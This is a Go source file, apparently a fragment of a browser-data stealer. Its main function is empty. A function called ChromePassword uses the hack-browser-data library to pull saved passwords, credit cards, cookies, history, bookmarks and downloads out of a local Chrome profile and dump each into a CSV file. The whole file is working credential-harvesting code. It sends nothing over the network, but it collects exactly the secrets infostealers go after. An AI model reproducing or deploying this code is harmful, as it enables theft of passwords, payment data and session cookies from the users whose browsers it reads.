package main

import (
	"fmt"

	hbd "github.com/moond4rk/hack-browser-data"
)

func main() {

}

func ChromePassword() {
	outputter := hbd.NewOutPutter(hbd.OutputCSV)
	b, err := hbd.NewBrowser(hbd.Chrome)
	if err != nil {
		panic(err)
	}
	password, err := b.GetBrowsingData(hbd.Password)
	if err != nil {
		panic(err)
	}
	file, err := outputter.CreateFile(hbd.Password.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(password, file)
	if err != nil {
		panic(err)
	}
	bookmark, err := b.GetBrowsingData(hbd.Bookmark)
	if err != nil {
		panic(err)
	}
	fils, err := outputter.CreateFile(hbd.Bookmark.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(bookmark, fils)
	if err != nil {
		panic(err)
	}
	history, err := b.GetBrowsingData(hbd.History)
	if err != nil {
		panic(err)
	}
	h, err := outputter.CreateFile(hbd.History.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(history, h)
	if err != nil {
		panic(err)
	}

	creditCard, err := b.GetBrowsingData(hbd.CreditCard)
	if err != nil {
		panic(err)
	}
	c, err := outputter.CreateFile(hbd.CreditCard.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(creditCard, c)
	if err != nil {
		panic(err)
	}

	download, err := b.GetBrowsingData(hbd.Download)
	if err != nil {
		panic(err)
	}
	d, err := outputter.CreateFile(hbd.Download.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(download, d)
	if err != nil {
		panic(err)
	}

	cookie, err := b.GetBrowsingData(hbd.Cookie)
	if err != nil {
		panic(err)
	}
	cc, err := outputter.CreateFile(hbd.Cookie.Name()+".csv", true)
	if err != nil {
		panic(err)
	}
	err = outputter.Write(cookie, cc)
	if err != nil {
		panic(err)
	}
}
